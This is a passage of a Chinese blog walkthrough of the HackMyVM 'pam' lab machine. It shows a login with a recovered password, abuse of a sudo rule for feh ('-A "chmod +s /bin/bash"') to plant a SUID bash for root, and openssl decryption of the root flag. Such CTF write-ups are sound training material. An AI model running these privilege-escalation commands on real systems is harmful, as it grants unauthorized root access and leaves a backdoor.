+<p><strong>png文件，保存后我们查看就可以了，发现有一个加密方式和一个字符串，可能就是这个用户的密码</strong></p>
+<p><img src="/2025/03/15/hack-my-vm-pam/3.png" alt="3"></p>
+<p><strong>尝试登录，直接那下user权限</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">www-data@pam:/home$ su italia</span><br><span class="line">su italia</span><br><span class="line">Password: rootisCLOSE</span><br><span class="line">/usr/bin/script -qc /bin/bash /dev/null</span><br><span class="line">italia@pam:/home$ </span><br><span class="line">/usr/bin/script -qc /bin/bash /dev/null</span><br><span class="line">italia@pam:/home$ </span><br></pre></td></tr></table></figure>
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">italia@pam:~$ sudo -l</span><br><span class="line">sudo -l</span><br><span class="line">Matching Defaults entries for italia on pam:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User italia may run the following commands on pam:</span><br><span class="line">    (ALL : ALL) NOPASSWD: /usr/bin/feh</span><br><span class="line">italia@pam:~$ </span><br></pre></td></tr></table></figure>
+
+<p><strong>这个feh是一个图片查看的工具，这个是一个图形工具，必须要有图形化界面，但是我们这个只是一个终端，没有图形化界面，我们只能看手册</strong></p>
+<p><img src="/2025/03/15/hack-my-vm-pam/4.png" alt="4"></p>
+<p><img src="/2025/03/15/hack-my-vm-pam/5.png" alt="5"></p>
+<p><strong>-u不用图形化，-A可以指定一个shell命令</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">italia@pam:~$ sudo /usr/bin/feh -A &quot;chmod +s /bin/bash&quot; -u user.txt</span><br><span class="line">sudo /usr/bin/feh -A &quot;chmod +s /bin/bash&quot; -u user.txt</span><br><span class="line">user.txt</span><br><span class="line">italia@pam:~$ </span><br></pre></td></tr></table></figure>
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">italia@pam:~$ bash -p</span><br><span class="line">bash -p</span><br><span class="line">bash-5.1# whoami</span><br><span class="line">whoami</span><br><span class="line">root</span><br><span class="line">bash-5.1# </span><br></pre></td></tr></table></figure>
+
+<h3>解密</h3>
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bash-5.1# ls</span><br><span class="line">ls</span><br><span class="line">root.enc</span><br><span class="line">bash-5.1# </span><br></pre></td></tr></table></figure>
+
+<p><strong>明显加密文件了，前面的图给我们一个加密算法，肯定是，但是这个加密算法，是要指定key的，我猜测rootisCLOSE就是key</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">bash-5.1# openssl enc -d -aes-256-cbc -in root.enc -out root.dec -k rootisCLOSE</span><br><span class="line">&lt;s-256-cbc -in root.enc -out root.dec -k rootisCLOSE</span><br><span class="line">*** WARNING : deprecated key derivation used.</span><br><span class="line">Using -iter or -pbkdf2 would be better.</span><br><span class="line">bash-5.1# cat root.dec</span><br><span class="line">HMVZcBzDKmcFJwnkdsnQbXV</span><br></pre></td></tr></table></figure>
+
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">总览</a></li>
+         
+          <li><a href="/tags/WEB-CTF/">CTF-WEB</a></li>
+         
+          <li><a href="/tags/PWN/">CTF-PWN</a></li>
+         
+          <li><a href="/tags/HACK-MY-VM/">HACK-MY-VM</a></li>
+         
+          <li><a href="/tags/try-hack-me/">TRY-HACK-ME</a></li>
+         
+          <li><a href="/tags/Vulhub">Vulhub</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">hack-my-vm-pam</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.0.1.</span> <span class="toc-text">端口扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.0.2.</span> <span class="toc-text">端口渗透</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.0.3.</span> <span class="toc-text">提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.0.4.</span> <span class="toc-text">解密</span></a></li></ol></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2025/03/15/hack-my-vm-pam/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2025/03/15/hack-my-vm-pam/&text=hack-my-vm-pam"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2025/03/15/hack-my-vm-pam/&title=hack-my-vm-pam"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2025/03/15/hack-my-vm-pam/&is_video=false&description=hack-my-vm-pam"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=hack-my-vm-pam&body=Check out this article: http://example.com/2025/03/15/hack-my-vm-pam/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2025/03/15/hack-my-vm-pam/&title=hack-my-vm-pam"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2025/03/15/hack-my-vm-pam/&title=hack-my-vm-pam"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2025/03/15/hack-my-vm-pam/&title=hack-my-vm-pam"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2025/03/15/hack-my-vm-pam/&title=hack-my-vm-pam"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2025/03/15/hack-my-vm-pam/&name=hack-my-vm-pam&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2025/03/15/hack-my-vm-pam/&t=hack-my-vm-pam"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menú</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Compartir</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Cap amunt</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2025
+    SunRT
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">总览</a></li>
+         
+          <li><a href="/tags/WEB-CTF/">CTF-WEB</a></li>
+         
+          <li><a href="/tags/PWN/">CTF-PWN</a></li>
+         
+          <li><a href="/tags/HACK-MY-VM/">HACK-MY-VM</a></li>
+         
+          <li><a href="/tags/try-hack-me/">TRY-HACK-ME</a></li>
+         
+          <li><a href="/tags/Vulhub">Vulhub</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+    <!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+<!-- clipboard -->
+
+  
+<script src="/lib/clipboard/clipboard.min.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"In die Zwischenablage kopiert!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Kopiert!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
